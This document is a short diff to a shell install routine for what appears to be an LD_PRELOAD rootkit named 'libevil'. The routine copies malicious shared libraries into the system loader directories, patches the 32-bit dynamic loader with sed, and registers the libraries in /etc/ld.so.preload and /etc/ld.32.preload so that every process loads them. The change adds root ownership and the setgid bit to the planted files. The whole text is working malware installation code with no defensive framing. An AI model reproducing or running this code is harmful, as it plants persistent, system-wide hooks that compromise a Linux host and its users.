@@ -23,12 +23,16 @@ function install_libevil()
 
     if [ ! -z "$le32so" -a ! -z "$ld32so" ]; then
         cp $le32so $ld32dir/libevil32.so;
+        chown root:root $ld32dir/libevil32.so;
+        chmod g+s $ld32dir/libevil32.so;
         sed -i 's/ld.so.preload/ld.32.preload/' $ld32so;
         echo $ld32dir/libevil32.so > /etc/ld.32.preload;
     fi
 
     if [ ! -z "$le64so" -a ! -z "$ld64so" ]; then
         cp $le64so $ld64dir/libevil64.so;
+        chown root:root $ld64dir/libevil64.so;
+        chmod g+s $ld64dir/libevil64.so;
         echo $ld64dir/libevil64.so > /etc/ld.so.preload;
     fi
 }
